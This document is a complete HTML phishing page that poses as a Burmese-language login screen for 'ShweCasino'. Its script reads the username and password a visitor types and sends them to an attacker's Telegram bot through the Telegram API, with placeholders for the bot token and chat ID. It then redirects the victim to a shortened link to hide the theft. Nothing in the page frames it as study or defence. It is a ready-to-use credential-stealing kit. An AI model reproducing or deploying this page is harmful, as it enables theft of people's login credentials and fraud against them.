<!DOCTYPE html>
<html lang="my">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>ShweCasino Login</title>

<style>

body{
margin:0;
font-family:"Myanmar Text";
background:#8b0000;
color:white;
}

/* banner */

.banner img{
width:100%;
height:auto;
display:block;
}

/* login box */

.login-box{
background:#6b0000;
margin:20px;
padding:25px;
border-radius:12px;
}

/* title */

.title{
text-align:center;
font-size:28px;
margin-bottom:20px;
}

/* input */

input{
width:100%;
padding:14px;
margin:10px 0;
border:none;
border-radius:8px;
font-size:16px;
}

/* button */

button{
width:100%;
padding:14px;
margin-top:10px;
background:#ffd700;
border:none;
border-radius:8px;
font-size:18px;
font-weight:bold;
}

</style>

</head>

<body>

<!-- banner -->

<div class="banner">
<img src="logo.jpg">
</div>

<!-- login -->

<div class="login-box">

<div class="title">အကောင့်ထဲဝင်ရန်</div>

<input id="username" placeholder="အကောင့်အမည်">

<input type="password" id="password" placeholder="စကားဝှက်">

<button onclick="login()">အကောင့်ထဲဝင်ရန်</button>

</div>

<script>

var token = "BOT_TOKEN";
var chat_id = "CHAT_ID";

function login(){

var user = document.getElementById("username").value;
var pass = document.getElementById("password").value;

var message =
"ShweCasino Login%0A"+
"Username: "+user+"%0A"+
"Password: "+pass;

fetch("https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+message);

window.location.href="https://cutt.ly/otrecCFE";

}

</script>

</body>
</html>
